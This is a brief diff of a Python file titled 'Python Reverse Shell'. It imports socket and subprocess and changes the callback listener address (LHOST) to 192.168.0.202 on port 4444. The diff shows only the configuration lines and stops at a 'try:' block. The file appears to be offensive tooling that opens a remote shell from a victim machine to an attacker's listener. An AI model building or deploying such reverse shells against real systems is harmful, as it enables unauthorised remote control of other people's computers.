@@ -6,7 +6,7 @@ Python Reverse Shell
 
 import socket, subprocess, os, sys
 
-LHOST = "192.168.1.100"
+LHOST = "192.168.0.202"
 LPORT = 4444
 
 try:
